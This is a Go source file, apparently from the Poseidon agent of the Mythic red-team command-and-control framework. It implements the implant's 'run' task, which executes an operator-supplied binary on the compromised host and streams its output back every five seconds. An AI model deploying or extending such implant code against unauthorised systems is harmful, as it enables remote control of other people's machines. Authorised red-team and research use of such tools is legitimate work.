package run

import (
	"bufio"
	"time"

	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

type runArgs struct {
	Path string   `json:"path"`
	Args []string `json:"args"`
}

// Run - Function that executes the run command
func Run(task structs.Task) {
	msg := structs.Response{}
	msg.TaskID = task.TaskID
	args := runArgs{}
	msg.TaskID = task.TaskID

	err := json.Unmarshal([]byte(task.Params), &args)
	if err != nil {
		msg.SetError(fmt.Sprintf("Failed to unmarshal parameters. Reason: %s", err.Error()))
		task.Job.SendResponses <- msg
		return
	}
	command := exec.Command(args.Path, args.Args...)
	command.Env = os.Environ()

	stdout, err := command.StdoutPipe()
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	stderr, err := command.StderrPipe()
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}

	stdoutScanner := bufio.NewScanner(stdout)
	stderrScanner := bufio.NewScanner(stderr)
	outputChannel := make(chan string, 1)
	doneChannel := make(chan bool)
	doneTimeDelayChannel := make(chan bool)
	sendTimeDelayChannel := make(chan bool)
	go func() {
		bufferedOutput := ""
		doneCount := 0
		for {
			select {
			case <-doneChannel:
				doneCount += 1
				if doneCount == 2 {
					outputMsg := structs.Response{}
					outputMsg.TaskID = task.TaskID
					outputMsg.Completed = true
					if bufferedOutput != "" {
						outputMsg.UserOutput = bufferedOutput
					} else {
						msg.UserOutput = fmt.Sprintf("No Output From Command")
					}
					task.Job.SendResponses <- outputMsg
					doneTimeDelayChannel <- true
					return
				}
			case newBufferedOutput := <-outputChannel:
				bufferedOutput += newBufferedOutput
			case <-sendTimeDelayChannel:
				if bufferedOutput != "" {
					outputMsg := structs.Response{}
					outputMsg.TaskID = task.TaskID
					outputMsg.UserOutput = bufferedOutput
					task.Job.SendResponses <- outputMsg
					bufferedOutput = ""
				}
			}
		}
	}()
	go func() {
		for stdoutScanner.Scan() {
			outputChannel <- fmt.Sprintf("%s\n", stdoutScanner.Text())
		}
		doneChannel <- true
	}()
	go func() {
		for stderrScanner.Scan() {
			outputChannel <- fmt.Sprintf("%s\n", stderrScanner.Text())
		}
		doneChannel <- true
	}()
	go func() {
		for {
			select {
			case <-doneTimeDelayChannel:
				return
			case <-time.After(5 * time.Second):
				sendTimeDelayChannel <- true
			}
		}
	}()
	err = command.Start()
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	err = command.Wait()
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	return
}
